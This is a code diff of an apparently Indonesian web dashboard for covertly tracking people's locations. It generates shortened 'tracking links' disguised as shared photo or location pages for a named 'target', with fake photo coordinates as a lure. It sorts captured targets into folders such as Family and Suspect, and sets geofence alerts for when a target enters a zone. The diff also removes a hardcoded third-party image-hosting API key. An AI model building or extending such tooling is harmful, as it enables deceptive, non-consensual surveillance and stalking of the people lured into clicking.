@@ -310,7 +310,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 .koord-title{color:var(--gold);font-size:10px;letter-spacing:2px;margin-bottom:10px;text-transform:uppercase}
 .koord-title::before{content:'◈ ';margin-right:4px}
 .koord-hint{font-size:9px;color:var(--text-d);margin-bottom:8px;line-height:1.6}
-/* ═══ MODE KOMPAK RESPONSIVE ═══ */
 @media (max-width: 899px) {
   body.compact-mode .term-body:has(#globeBox),
   body.compact-mode .term-body:has(#radarGlobal),
@@ -345,7 +344,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 @media (min-width: 1400px) {
   body.compact-mode .wrap { grid-template-columns: repeat(3, 1fr); }
 }
-/* ═══ INFO PANEL ═══ */
 .info-panel{font-size:10px;line-height:1.8;color:var(--text-d)}
 .info-panel .ip-title{color:var(--gold);font-size:11px;font-weight:bold;letter-spacing:2px;margin-bottom:8px}
 .info-panel .ip-sub{color:var(--cyan);font-weight:bold;font-size:10px;margin-top:10px;margin-bottom:4px;letter-spacing:1px}
@@ -437,7 +435,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Alert] Geofence Monitor</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi kalau target masuk zona.</div><div class="geo-row"><input id="geoLat" class="geo-inp" placeholder="Latitude" type="number" step="any"><input id="geoLng" class="geo-inp" placeholder="Longitude" type="number" step="any"><input id="geoRadius" class="geo-inp" placeholder="Radius (m)" type="number" value="500" style="max-width:90px"></div><div style="display:flex;gap:6px;margin-bottom:10px"><button class="term-btn outline" onclick="setGeofence()" style="margin:0">Set Geofence</button><button class="term-btn danger" onclick="clearGeofence()" style="margin:0;flex:0 0 auto;width:auto;padding:0 16px">Clear</button></div><div class="geo-status" id="geoStatus">Belum diset</div><div class="geo-alert" id="geoAlert"></div></div>
 <div class="term-body"><div class="prompt">[Generate] Tracking Link</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div><input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off"><div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div><input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" spellcheck="false"><div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div><div class="sched-row"><label>⏰ EXPIRED:</label><select id="linkExpiry"><option value="0">∞ Tidak expired</option><option value="15">15 menit</option><option value="60">1 jam</option><option value="360">6 jam</option><option value="1440" selected>24 jam</option><option value="10080">7 hari</option><option value="43200">30 hari</option></select></div><div class="sched-info" id="schedInfo">› Link akan expired otomatis setelah <b>24 jam</b>.</div>
 
-<!-- ═══ FORM KOORDINAT FOTO ═══ -->
 <div class="koord-box" id="koordBox">
   <div class="koord-title">Lokasi Foto (untuk target lihat)</div>
   <div class="koord-hint">
@@ -460,7 +457,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 
 <div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link (auto-shorten via is.gd):</div>
 
-<!-- ═══ GRUP 1: LINK GENERATOR ═══ -->
 <div style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px">
   <div style="color:var(--cyan);font-size:11px;font-weight:bold;margin-bottom:12px;letter-spacing:2px;text-transform:uppercase">◈ Link Generator</div>
   <section style="margin-bottom:16px">
@@ -475,22 +471,36 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
   </section>
 </div>
 
-<!-- ═══ GRUP 2: SHARE LOCATION ═══ -->
 <div style="padding:16px 0;border-top:1px solid var(--border);margin-top:12px">
   <div style="color:var(--cyan);font-size:11px;font-weight:bold;margin-bottom:12px;letter-spacing:2px;text-transform:uppercase">◈ Share Location</div>
+  
+  <div style="font-size:10px;color:var(--text-d);margin-bottom:8px;line-height:1.6">
+    › <b style="color:var(--gold)">Cara pakai:</b> Upload foto ke GitHub dulu, lalu copy URL jsDelivr-nya ke kolom di bawah.<br>
+    › Contoh: <span style="color:var(--cyan)">https://cdn.jsdelivr.net/gh/roraxbali/image-hosting@main/images.jpg</span>
+  </div>
+  
+  <input id="inputFotoUrl" class="term-input" placeholder="Tempel URL foto dari GitHub/jsDelivr..." style="margin-bottom:8px">
+  
   <section style="margin-bottom:16px">
-    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 1</div>
-    <button class="term-btn outline" onclick="document.getElementById('dashFotoInput').click()">Upload Share Loc 1</button>
-    <div id="FOTOResult" style="display:none;margin-top:12px"><div id="FOTOLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="FOTOUrl"></div><button class="term-btn outline" id="FOTOCopy" style="margin-top:10px">📋 Salin Link</button></div>
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 1 (view.html)</div>
+    <button class="term-btn outline" onclick="genShareLoc1()">Generate Share Loc 1</button>
+    <div id="FOTOResult" style="display:none;margin-top:12px">
+      <div id="FOTOLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div>
+      <div class="link-url-box" id="FOTOUrl"></div>
+      <button class="term-btn outline" id="FOTOCopy" style="margin-top:10px">📋 Salin Link</button>
+    </div>
   </section>
+  
   <section>
-    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 2</div>
-    <button class="term-btn outline" onclick="document.getElementById('dashFotoInputVercel').click()">Upload Share Loc 2</button>
-    <div id="PROResult" style="display:none;margin-top:12px"><div id="PROLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div><div class="link-url-box" id="PROUrl"></div><button class="term-btn outline" id="PROCopy" style="margin-top:10px">📋 Salin Link</button></div>
+    <div style="color:var(--gold);font-size:11px;margin-bottom:10px">Share Loc 2 (Vercel)</div>
+    <button class="term-btn outline" onclick="genShareLoc2()">Generate Share Loc 2</button>
+    <div id="PROResult" style="display:none;margin-top:12px">
+      <div id="PROLabel" style="font-size:10px;color:var(--text-d);margin-bottom:6px"></div>
+      <div class="link-url-box" id="PROUrl"></div>
+      <button class="term-btn outline" id="PROCopy" style="margin-top:10px">📋 Salin Link</button>
+    </div>
   </section>
 </div>
-<input type="file" id="dashFotoInput" accept="image/*" style="display:none" onchange="onDashFotoPicked(event)">
-<input type="file" id="dashFotoInputVercel" accept="image/*" style="display:none" onchange="onDashFotoPickedVercel(event)">
 </div>
 
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">CSV</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">JSON</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">Clear</button></div></div>
@@ -635,7 +645,6 @@ let soundEnabled=localStorage.getItem('soundEnabled')!=='false';
 window.toggleSound=()=>{soundEnabled=!soundEnabled;localStorage.setItem('soundEnabled',soundEnabled);const b=document.getElementById('soundToggle');if(soundEnabled){b.innerText='🔊 ON';b.classList.add('active')}else{b.innerText='🔇 OFF';b.classList.remove('active')}};
 setTimeout(()=>{const b=document.getElementById('soundToggle');soundEnabled?b.classList.add('active'):b.classList.remove('active')},100);
 
-/* ═══ MODE KOMPAK ═══ */
 window.toggleCompactMode = function() {
   const isCompact = document.body.classList.toggle('compact-mode');
   localStorage.setItem('compactMode', isCompact);
@@ -643,12 +652,10 @@ window.toggleCompactMode = function() {
   if (!btn) return;
   if (isCompact) {
     btn.innerText = '🖥️ Mode Lengkap'; btn.classList.add('active');
-    if (window.addLog) addLog('📱 Mode Kompak aktif — panel sekunder disembunyikan', 'ok');
-    if (window.actLog) actLog('📱 Mode Kompak diaktifkan', 'info');
+    if (window.addLog) addLog('📱 Mode Kompak aktif', 'ok');
   } else {
     btn.innerText = '📱 Mode Kompak'; btn.classList.remove('active');
-    if (window.addLog) addLog('🖥️ Mode Lengkap aktif — semua panel ditampilkan', 'ok');
-    if (window.actLog) actLog('🖥️ Mode Lengkap diaktifkan', 'info');
+    if (window.addLog) addLog('🖥️ Mode Lengkap aktif', 'ok');
   }
   if (window.beep) beep(1800, 0.08);
 };
@@ -794,9 +801,7 @@ function showLoading(type){
   if(labelEl)labelEl.innerText='› target link ('+type+') — MEMPERPENDEK...';
   urlBox.innerHTML='<div style="padding:12px;text-align:center;color:var(--gold);font-size:11px;letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
 }
-const IMGBB_API_KEY = '913294d7a5148a6415a3b9d9153c9bbf';
 
-/* ═══ FUNGSI KOORDINAT FOTO ═══ */
 window.dashAmbilLokasiSaya = function(){
   if(!navigator.geolocation){
     alert('Browser tidak mendukung GPS.');
@@ -886,58 +891,46 @@ window.dashAmbilKoordinat = function(){
   return { lat, lng, nama };
 };
 
-window.onDashFotoPicked = async function(event){
-  const file = event.target.files && event.target.files[0];
-  if(!file) return;
-  if(!file.type.startsWith('image/')){ alert('File harus gambar.'); event.target.value=''; return; }
-  if(file.size > 10*1024*1024){ alert('Maks 10 MB.'); event.target.value=''; return; }
+window.genShareLoc1 = async function(){
   playKlik();
-  addLog('📷 Upload foto: ' + file.name);
-  actLog('📷 Upload foto: ' + file.name, 'info');
+  const fotoUrl = document.getElementById('inputFotoUrl').value.trim();
+  if(!fotoUrl){ alert('Tempel URL foto dulu!'); return; }
+  if(!/^https?:\/\//i.test(fotoUrl)){ alert('URL harus mulai https://'); return; }
+  
   const resBox = document.getElementById('FOTOResult');
   const urlBox = document.getElementById('FOTOUrl');
   const labelEl = document.getElementById('FOTOLabel');
   resBox.style.display = 'block';
-  if(labelEl) labelEl.innerText = '› mengunggah foto...';
-  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Upload ke ImgBB...</div>';
-  try{
-    const base64 = await new Promise((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onload = () => resolve(reader.result.split(',')[1]);
-      reader.onerror = reject;
-      reader.readAsDataURL(file);
-    });
-    const formData = new FormData();
-    formData.append('key', IMGBB_API_KEY);
-    formData.append('image', base64);
-    const resp = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: formData });
-    const json = await resp.json();
-    if(!json.success){ throw new Error(json.error?.message || 'Upload ImgBB gagal'); }
-    const downloadUrl = json.data.url;
-    addLog('✓ Foto terupload: ' + (json.data.id || ''), 'ok');
+  if(labelEl) labelEl.innerText = '› membuat link Share Loc 1...';
+  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Memproses...</div>';
+  
+  try {
     const t = document.getElementById('targetName').value.trim() || 'target';
     const koord = dashAmbilKoordinat();
-    let longUrl = linkBase() + '/view.html?foto=' + encodeURIComponent(downloadUrl) + '&u=' + encodeURIComponent(user);
+    
+    let longUrl = linkBase() + '/view.html?foto=' + encodeURIComponent(fotoUrl) + '&u=' + encodeURIComponent(user);
     if (koord) {
       longUrl += '&lat=' + koord.lat + '&lng=' + koord.lng;
       if (koord.nama) longUrl += '&nama=' + encodeURIComponent(koord.nama);
-      addLog('📍 Koordinat disertakan: ' + koord.lat + ', ' + koord.lng, 'ok');
+      addLog('📍 Koordinat: ' + koord.lat + ', ' + koord.lng, 'ok');
     } else {
-      addLog('⚠ Tidak ada koordinat — target akan lihat lokasi default', 'warn');
+      addLog('⚠ Tanpa koordinat', 'warn');
     }
-    window.currentLink = longUrl;
-    window.lastLongLink = longUrl;
-    window.currentFotoUrl = downloadUrl;
+    
+    window.currentLink = longUrl; window.lastLongLink = longUrl;
+    window.currentFotoUrl = fotoUrl;
+    
     if(labelEl) labelEl.innerText = '› memperpendek link...';
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
+    
     const result = await autoShorten(longUrl);
     if(result.ok){
       window.currentShortLink = result.short;
       showBothLinks(longUrl, result.short, 'FOTO');
-      addLog('✓ Shortlink foto: ' + result.short, 'ok');
-      actLog('📷 Link FOTO: ' + t, 'link');
-      if(window.clipAdd) clipAdd(result.short, 'FOTO');
-      if(window.clipAdd) clipAdd(longUrl, 'FOTO');
+      addLog('✓ Share Loc 1: ' + result.short, 'ok');
+      actLog('📷 Share Loc 1: ' + t, 'link');
+      if(window.clipAdd) clipAdd(result.short, 'SHARE-LOC-1');
+      if(window.clipAdd) clipAdd(longUrl, 'SHARE-LOC-1');
       beep(1800, 0.08);
       const qr = document.getElementById('qrInput');
       const sh = document.getElementById('shortInput');
@@ -945,73 +938,61 @@ window.onDashFotoPicked = async function(event){
       if(sh) sh.value = longUrl;
     } else {
       showBothLinks(longUrl, null, 'FOTO');
-      addLog('⚠ Shortlink gagal, pakai link panjang', 'warn');
-      if(window.clipAdd) clipAdd(longUrl, 'FOTO');
+      addLog('⚠ Shortlink gagal', 'warn');
+      if(window.clipAdd) clipAdd(longUrl, 'SHARE-LOC-1');
     }
+    
     const preview = document.createElement('img');
-    preview.src = downloadUrl;
+    preview.src = fotoUrl;
     preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--gold-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
-    preview.onclick = () => window.open(downloadUrl, '_blank');
+    preview.onclick = () => window.open(fotoUrl, '_blank');
     urlBox.appendChild(preview);
   } catch(e){
-    addLog('✗ Upload gagal: ' + e.message, 'err');
+    addLog('✗ Gagal: ' + e.message, 'err');
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--red)">✗ Gagal: ' + e.message + '</div>';
-  } finally {
-    event.target.value = '';
   }
 };
-window.onDashFotoPickedVercel = async function(event){
-  const file = event.target.files && event.target.files[0];
-  if(!file) return;
-  if(!file.type.startsWith('image/')){ alert('File harus gambar.'); event.target.value=''; return; }
-  if(file.size > 10*1024*1024){ alert('Maks 10 MB.'); event.target.value=''; return; }
+
+window.genShareLoc2 = async function(){
   playKlik();
-  addLog('📷 Upload foto (Vercel): ' + file.name);
-  actLog('📷 Upload foto (Vercel): ' + file.name, 'info');
+  const fotoUrl = document.getElementById('inputFotoUrl').value.trim();
+  if(!fotoUrl){ alert('Tempel URL foto dulu!'); return; }
+  if(!/^https?:\/\//i.test(fotoUrl)){ alert('URL harus mulai https://'); return; }
+  
   const resBox = document.getElementById('PROResult');
   const urlBox = document.getElementById('PROUrl');
   const labelEl = document.getElementById('PROLabel');
   resBox.style.display = 'block';
-  if(labelEl) labelEl.innerText = '› mengunggah foto (dynamic preview)...';
-  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Upload ke ImgBB...</div>';
-  try{
-    const base64 = await new Promise((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onload = () => resolve(reader.result.split(',')[1]);
-      reader.onerror = reject;
-      reader.readAsDataURL(file);
-    });
-    const formData = new FormData();
-    formData.append('key', IMGBB_API_KEY);
-    formData.append('image', base64);
-    const resp = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: formData });
-    const json = await resp.json();
-    if(!json.success){ throw new Error(json.error?.message || 'Upload ImgBB gagal'); }
-    const downloadUrl = json.data.url;
-    addLog('✓ Foto terupload: ' + (json.data.id || ''), 'ok');
+  if(labelEl) labelEl.innerText = '› membuat link Share Loc 2...';
+  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Memproses...</div>';
+  
+  try {
     const t = document.getElementById('targetName').value.trim() || 'target';
     const koord = dashAmbilKoordinat();
-    let longUrl = 'https://official-brown-iota.vercel.app/api/p?foto=' + encodeURIComponent(downloadUrl) + '&u=' + encodeURIComponent(user);
+    
+    let longUrl = 'https://official-brown-iota.vercel.app/api/p?foto=' + encodeURIComponent(fotoUrl) + '&u=' + encodeURIComponent(user);
     if (koord) {
       longUrl += '&lat=' + koord.lat + '&lng=' + koord.lng;
       if (koord.nama) longUrl += '&nama=' + encodeURIComponent(koord.nama);
-      addLog('📍 Koordinat disertakan (PRO): ' + koord.lat + ', ' + koord.lng, 'ok');
+      addLog('📍 Koordinat (SL2): ' + koord.lat + ', ' + koord.lng, 'ok');
     } else {
-      addLog('⚠ Tidak ada koordinat — target akan lihat lokasi default', 'warn');
+      addLog('⚠ Tanpa koordinat', 'warn');
     }
-    window.currentLink = longUrl;
-    window.lastLongLink = longUrl;
-    window.currentFotoUrl = downloadUrl;
+    
+    window.currentLink = longUrl; window.lastLongLink = longUrl;
+    window.currentFotoUrl = fotoUrl;
+    
     if(labelEl) labelEl.innerText = '› memperpendek link...';
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
+    
     const result = await autoShorten(longUrl);
     if(result.ok){
       window.currentShortLink = result.short;
       showBothLinks(longUrl, result.short, 'DYNAMIC FOTO');
-      addLog('✓ Shortlink dynamic: ' + result.short, 'ok');
-      actLog('📷 Link VERCEL FOTO: ' + t, 'link');
-      if(window.clipAdd) clipAdd(result.short, 'FOTO-DYN');
-      if(window.clipAdd) clipAdd(longUrl, 'FOTO-DYN');
+      addLog('✓ Share Loc 2: ' + result.short, 'ok');
+      actLog('📷 Share Loc 2: ' + t, 'link');
+      if(window.clipAdd) clipAdd(result.short, 'SHARE-LOC-2');
+      if(window.clipAdd) clipAdd(longUrl, 'SHARE-LOC-2');
       beep(1800, 0.08);
       const qr = document.getElementById('qrInput');
       const sh = document.getElementById('shortInput');
@@ -1019,21 +1000,21 @@ window.onDashFotoPickedVercel = async function(event){
       if(sh) sh.value = longUrl;
     } else {
       showBothLinks(longUrl, null, 'DYNAMIC FOTO');
-      addLog('⚠ Shortlink gagal, pakai link panjang', 'warn');
-      if(window.clipAdd) clipAdd(longUrl, 'FOTO-DYN');
+      addLog('⚠ Shortlink gagal', 'warn');
+      if(window.clipAdd) clipAdd(longUrl, 'SHARE-LOC-2');
     }
+    
     const preview = document.createElement('img');
-    preview.src = downloadUrl;
+    preview.src = fotoUrl;
     preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--cyan-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
-    preview.onclick = () => window.open(downloadUrl, '_blank');
+    preview.onclick = () => window.open(fotoUrl, '_blank');
     urlBox.appendChild(preview);
   } catch(e){
-    addLog('✗ Upload gagal: ' + e.message, 'err');
+    addLog('✗ Gagal: ' + e.message, 'err');
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--red)">✗ Gagal: ' + e.message + '</div>';
-  } finally {
-    event.target.value = '';
   }
 };
+
 window.genLink=async function(){
   playKlik();saveBase();
   const t=document.getElementById('targetName').value.trim()||'target';
